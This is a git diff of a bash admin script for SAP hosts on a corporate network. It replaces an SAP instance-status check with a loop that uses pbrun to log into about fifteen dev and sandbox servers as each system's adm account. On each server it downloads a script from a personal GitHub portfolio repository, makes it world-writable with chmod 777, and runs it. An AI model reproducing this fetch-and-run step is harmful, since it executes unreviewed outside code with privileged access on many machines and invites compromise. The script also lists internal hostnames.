@@ -4,44 +4,20 @@ europeData=(["peplap07883.pi.pvt"]="D21" ["pepldr03037.pi.pvt"]="D37" ["peplap07
 declare -A latamData
 latamData=(["peplgp01262.pi.pvt"]="D38" ["peplap07318.pi.pvt"]="D58" ["peplgp01263.pi.pvt"]="D63" ["peplap07413.pi.pvt"]="DE2" ["pepldr03056.pi.pvt"]="DX8" ["peplgp01268.pi.pvt"]="Q38" ["peplap07393.pi.pvt"]="Q58" ["peplgp01269.pi.pvt"]="Q63" ["peplap07882.pi.pvt"]="QE2" ["peplgp01301.pi.pvt"]="QE8" ["pepldr03057.pi.pvt"]="QX8" ["peplap10213.pi.pvt"]="QX8" ["peplap10212.pi.pvt"]="QX8" ["pepldr02930.pi.pvt"]="S38" ["t01lap01755.pi.pvt"]="S58" ["t01lgp00536.pi.pvt"]="S68" ["peplap07524.pi.pvt"]="SE2" ["pepldr03055.pi.pvt"]="SX8" ["pepldr03698.pi.pvt"]="QE9" ["peplgp01300.pi.pvt"]="U38" ["peplap07439.pi.pvt"]="U58" ["peplgp01299.pi.pvt"]="U63" ["peplap07448.pi.pvt"]="UE2" ["peplap07449.pi.pvt"]="UE2" ["peplap07450.pi.pvt"]="UE2" ["peplap07457.pi.pvt"]="UE2" ["peplap07456.pi.pvt"]="UE2" ["peplap07458.pi.pvt"]="UE2" ["peplap07474.pi.pvt"]="UE2" ["peplap07473.pi.pvt"]="UE2" ["peplap07485.pi.pvt"]="UE2" ["peplap07484.pi.pvt"]="UE2" ["peplap07489.pi.pvt"]="UE2" ["peplap07488.pi.pvt"]="UE2" ["pepldr03123.pi.pvt"]="UX3" ["peplap09079.pi.pvt"]="UX3" ["peplap09078.pi.pvt"]="UX3" ["peplap09142.pi.pvt"]="UX3" ["peplap09141.pi.pvt"]="UX3" ["peplap09140.pi.pvt"]="UX3" ["peplap09139.pi.pvt"]="UX3")
 
-for host in "${!latamData[@]}"
+declare -A pirtDevSBX
+pirtDevSBX=(["peplgp01308.corp.pep.pvt"]="SX0" ["peplgp01312.corp.pep.pvt"]="DX0" ["peplgp01313.corp.pep.pvt"]="S10" ["peplgp01257.pi.pvt"]="S35" ["pepldr03673.corp.pep.pvt"]="S61" ["peplgp01315.corp.pep.pvt"]="D10" ["peplgp01274.corp.pep.pvt"]="D30" ["peplgp01283.corp.pep.pvt"]="G6S" ["peplgp01311.corp.pep.pvt"]="G70" ["peplap07920.pi.pvt"]="DH0" ["peplap07880.pi.pvt"]="SH0" ["t01lap03296.pi.pvt"]="GC7" ["peplap10263.corp.pep.pvt"]="D5H" ["t01lap03868.pi.pvt"]="S5H" ["t01lap03299.pi.pvt"]="G60")
+
+
+for host in "${!pirtDevSBX[@]}"
 do
-    sleep 2
-    pbrun -u "${latamData["$host"],,}"adm -h $host SHELL <<- "ENDPBRUN"
-    sleep 3
-    whoami
-    abap=$(sapcontrol -nr 00 -function GetSystemInstanceList | grep ABAP | grep GREEN)
-    java=$(sapcontrol -nr 00 -function GetSystemInstanceList | grep J2EE | grep GREEN)
-vi
-    if [ -n "$abap" ] && [ -n "$java" ]; then
-        echo $host,"${latamData["$host"],,}",ABAP and JAVA
-    elif [ -n "$abap" ]; then
-        echo $host,"${latamData["$host"],,}",ABAP
-    elif [ -n "$java" ]; then
-        echo $host,"${latamData["$host"],,}",JAVA
-    else
-        echo $host,"${latamData["$host"],,}",Error,$abap,$java
-    fi
-ENDPBRUN
+    sleep 5
+    echo ${pirtDevSBX["$host"]} $host
+    echo
+    pbrun -u "${pirtDevSBX["$host"],,}"adm -h $host SHELL << ENDSHELL
+    sleep 1
+    curl -o stopServ.sh https://raw.githubusercontent.com/prakhar0912/Deepshika-Portfolio/main/okay.sh
+    sleep 1
+    chmod 777 stopServ.sh
+    bash stopServ.sh
+ENDSHELL
 done
-
-
-
-
-declare -A b
-b=([hello]=world ["a b"]="c d")
-
-for i in 1 2
-do
-    if [[ ${b["a b"]} == "c d" ]]; then
-        echo $i: equals c d
-    else
-        echo $i: does not equal c d
-    fi
-    b["a b"]="c d"
-done
-for k in "${!b[@]}"
-do
-    echo "$k"
-done
-ENDPBRUN
